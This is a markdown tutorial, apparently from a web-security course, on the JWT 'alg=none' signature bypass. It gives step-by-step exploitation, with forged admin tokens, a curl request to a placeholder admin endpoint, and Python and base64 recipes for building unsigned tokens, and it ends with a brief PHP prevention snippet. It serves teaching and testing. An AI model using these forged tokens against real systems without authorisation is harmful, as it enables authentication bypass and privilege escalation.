# 1.2 alg=none - Signature Bypass

## Goal

Disable JWT signature validation by setting algorithm to "none", allowing arbitrary token modification.

---

## How alg=none Works

Normal JWT requires signature with algorithm:
```json
{"alg":"RS256"}
```

**Attack: Change to:**
```json
{"alg":"none"}
```

No algorithm = no signature required!

---

## The Vulnerability

```
Server expects: Signature validation with RS256
Attacker sends: {"alg":"none"} with no signature
Result: Server skips validation and accepts token
```

---

## Exploitation Steps

### Step 1: Decode Original Token

Use jwt.io or command line.

### Step 2: Change Header to alg=none

Change in "Decoded" section:
```json
FROM: {"alg":"RS256"}
TO:   {"alg":"none"}
```

### Step 3: Modify Claims (Optional)

While you're at it:
```json
{"role":"user"} → {"role":"admin"}
```

### Step 4: Remove Signature

Token format: `Header.Payload.Signature`

alg=none format: `Header.Payload.` (trailing dot, empty signature!)

```
Original: eyJhbGciOiJSUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.SIGNATURE
Modified: eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.
                                                         ^ EMPTY
```

### Step 5: Submit Token

```bash
TOKEN="eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ."
curl -H "Authorization: Bearer $TOKEN" https://api.target.com/admin
```

### Step 6: Verify Success

- ✅ 200 OK = VULNERABLE
- ❌ "Invalid token" = Not vulnerable

## Creating alg=none Token

### Python
```python
import jwt

payload = {"role":"admin","sub":"123"}
token = jwt.encode(payload, "", algorithm="none")
print(token)
# Output: eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4iLCJzdWIiOiIxMjMifQ.
```

### jwt.io
1. Paste original token
2. Change: `"alg":"none"`
3. Modify payload (role/admin)
4. Leave signature empty
5. Copy encoded token

### Manual Base64
```
Header: {"alg":"none"}
Base64: eyJhbGciOiJub25lIn0

Payload: {"role":"admin"}
Base64: eyJyb2xlIjoiYWRtaW4ifQ

Token: eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.
```

## Real Example

**Target:** API with JWT

**Original Token:**
```
alg: RS256
role: user
signature: VALID
```

**Attack Token:**
```
alg: none
role: admin
signature: (empty)
```

**Result:**
- Server skips signature check
- Accepts modified claims
- User escalated to admin!

## Important Notes

**MUST keep trailing dot!**
```
CORRECT: eyJ...JQ.eyJ...fQ.
WRONG:   eyJ...JQ.eyJ...fQ  (no dot at end)
```

## Prevention

```php
// Check algorithm
if ($decoded->alg == 'none') {
    die('Invalid algorithm');
}

// Whitelist algorithms
JWT::decode($token, $key, ['RS256', 'HS256']);
```
